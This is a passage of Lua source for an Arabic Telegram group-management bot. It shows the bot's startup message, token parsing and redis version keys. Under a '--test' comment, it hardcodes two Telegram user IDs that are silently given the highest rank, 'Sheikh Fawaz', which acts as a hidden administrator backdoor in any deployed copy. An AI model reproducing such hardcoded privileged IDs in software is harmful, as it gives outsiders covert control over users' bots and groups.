...
print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل سورس حمد الآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
boss = Token:match("(%d+)")
redis:mset(
boss..":VERSION","1.0",
...
--test
if msg.sender_user_id_ == 2034770645 or msg.sender_user_id_ == 1619524486  then 
msg.TheRankCmd = 'الشيخ فواز'
msg.TheRank = 'الشيخ فواز'
msg.Rank = 1
